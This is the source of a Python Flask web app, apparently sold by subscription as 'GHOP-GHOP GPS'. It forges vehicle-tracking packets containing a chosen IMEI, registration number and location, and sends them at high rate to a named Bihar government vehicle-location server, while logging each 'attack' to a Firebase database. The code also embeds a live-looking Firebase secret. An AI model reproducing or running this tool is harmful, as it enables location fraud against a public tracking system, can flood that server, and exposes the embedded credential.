import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_final_whatsapp_edition"

# --- CONFIGURATION ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; margin-bottom: 20px; }
        .msg { color: #f00; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
        .contact-admin { border-top: 1px solid #333; padding-top: 15px; font-size: 12px; color: #888; }
        .contact-admin a { color: #0f0; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 style="letter-spacing: 2px;">🫦 GHOP-GHOP GPS</h2>
        {% if error %}<div class="msg">{{error}}</div>{% endif %}
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN</button>
        </form>
        <div class="contact-admin">
            FOR NEW ID OR HELP<br>
            CONTACT ADMIN: <a href="https://wa.me/917464010787" target="_blank">WHATSAPP</a>
        </div>
    </div>
</body>
</html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input, select { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .reset { background: #333; color: #fff; }
        .logout { background: none; color: #f00; border: 1px solid #f00; padding: 5px; font-size: 10px; cursor: pointer; float: left; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
        label { font-size: 11px; color: #aaa; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button class="logout">LOGOUT: {{session['user']}}</button></form>
        <div style="clear:both;"></div>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        
        <form action="/action" method="post" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" placeholder="BR01..." oninput="this.value = this.value.toUpperCase(); updateUI();" onblur="checkVehicle()"></div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" placeholder="862..." oninput="updateUI()"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updateUI()"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updateUI()"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            <div class="full">
                <label>PROTOCOL (50 PKT/SEC)</label>
                <select name="proto" id="proto" onchange="updateUI()">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP</option>
                </select>
            </div>
            {% if session['access_level'] == 'pro' %}
            <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
            {% endif %}
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{lat or 25.65}}, {{lon or 84.78}}], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{lat or 25.65}}, {{lon or 84.78}}]).addTo(map);
        function updateUI() {
            let la = document.getElementById('lat').value || "0.000000";
            let lo = document.getElementById('lon').value || "0.000000";
            if(la && lo) {
                let pos = [parseFloat(la), parseFloat(lo)];
                map.setView(pos, 15);
                marker.setLatLng(pos);
            }
        }
        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase();
            if(!vno) return;
            let res = await fetch(`/check_vehicle?vno=${vno}`);
            let data = await res.json();
            if(data.imei) { document.getElementById('imei').value = data.imei; updateUI(); }
        }
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    document.getElementById('lat').value = pos.coords.latitude.toFixed(6);
                    document.getElementById('lon').value = pos.coords.longitude.toFixed(6);
                    updateUI();
                }, () => alert("Location denied."));
            }
        }
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);
        updateUI();
    </script>
</body>
</html>
"""

def get_user_data(uid):
    try:
        r = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", timeout=5)
        return r.json()
    except: return None

def log_to_firebase():
    try:
        now = datetime.now()
        date_key = now.strftime('%Y-%m-%d')
        time_key = now.strftime('%H%M%S')
        user_id = session.get('user')
        vno = status["vno"]
        log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
        requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{date_key}/{user_id}/{vno}/{time_key}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            f_lat = "{:.6f}".format(float(status["lat"])) if status["lat"] else "0.000000"
            f_lon = "{:.6f}".format(float(status["lon"])) if status["lon"] else "0.000000"
            f_date = now.strftime('%d%m%Y')
            f_time = now.strftime('%H%M%S')
            
            # --- UPDATED MIJO STRING (STRICT NO SPACES) ---
            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{status['imei']},{status['vno']},1,{f_date},{f_time},{f_lat},N,{f_lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*".encode()
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP":
                sock.settimeout(3); sock.connect(target); sock.send(pkt)
            else: sock.sendto(pkt, target)
            status["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    error = None
    if request.method == 'POST':
        uid = request.form.get('userid', '').strip()
        pw = request.form.get('password', '').strip()
        data = get_user_data(uid)
        if data and str(data.get('password')) == str(pw):
            exp_str = data.get('expiry', '2000-01-01')
            if datetime.now() > datetime.strptime(exp_str, '%Y-%m-%d'): error = f"EXPIRED ON {exp_str}"
            elif data.get('status') != "Active": error = "ACCOUNT BLOCKED!"
            else:
                session['user'] = uid
                session['access_level'] = data.get('access_level', 'basic')
                session['def_lat'] = str(data.get('lat', ''))
                session['def_lon'] = str(data.get('lon', ''))
                status.update({"lat": session['def_lat'], "lon": session['def_lon']})
                return redirect(url_for('dashboard'))
        else: error = "INVALID ID OR PASSWORD"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, session=session, **status)

@app.route('/action', methods=['POST'])
def action():
    if 'user' not in session: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "reset":
        status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat', ''), "lon": session.get('def_lon', '')})
    else:
        status.update({
            "imei": request.form.get('imei', '').strip(),
            "vno": request.form.get('vno', '').upper().strip(),
            "lat": request.form.get('lat', '').strip(),
            "lon": request.form.get('lon', '').strip(),
            "proto": request.form.get('proto', 'UDP')
        })
        if val == "start" and not status["firing"]:
            if all([status["imei"], status["vno"], status["lat"]]):
                status["firing"] = True
                log_to_firebase()
                threading.Thread(target=firing_engine, daemon=True).start()
        elif val == "stop": status["firing"] = False
    return redirect(url_for('dashboard'))

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    try:
        r = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", timeout=5)
        data = r.json()
        if data: return jsonify({"imei": data.get('IMEI_No')})
    except: pass
    return jsonify({"imei": None})

@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/data')
def data(): return jsonify(status)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
